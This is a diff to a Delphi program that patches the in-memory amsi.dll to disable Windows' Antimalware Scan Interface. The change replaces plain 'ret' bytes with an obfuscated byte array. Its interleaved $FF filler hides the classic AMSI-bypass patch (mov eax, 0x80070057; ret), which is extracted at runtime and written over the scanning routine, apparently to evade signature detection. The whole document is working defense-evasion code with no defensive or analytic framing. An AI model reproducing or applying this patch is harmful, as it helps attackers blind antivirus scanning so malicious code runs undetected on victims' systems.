@@ -15,9 +15,16 @@ http://www.delphigroups.info/2/04/106991.html
 uses
   SysUtils, Windows;
 
+type
+  TByteArr = array of Byte;
 
 const
   Ass : Array[0..7] of byte = ($c3,$c3,$c3,$c3,$c3,$c3,$c3,$c3);
+  AssTwo : Array[0..11] of byte = ($FF,$B8,$FF,$57,$FF,$00,$FF,$07,$FF,$80,$FF,$C3);
+
+var
+  BA, NBA: TByteArr;
+
 
 function WriteBytes(pAddress: Pointer; Bytes: Array of Byte): Boolean;
 var
@@ -52,9 +59,17 @@ end;
 begin
 var
   asbres : Pointer;
+
 try
   asbres := LoadAndFind('amsi.dll');
-  WriteBytes(asbres,Ass);
+  SetLength(BA,6);
+  BA[0] := AssTwo[1];
+  BA[1] := AssTwo[3];
+  BA[2] := AssTwo[5];
+  BA[3] := AssTwo[7];
+  BA[4] := AssTwo[9];
+  BA[5] := AssTwo[11];
+  WriteBytes(asbres,BA);
   except
     on E: Exception do
       Writeln(E.ClassName, ': ', E.Message);
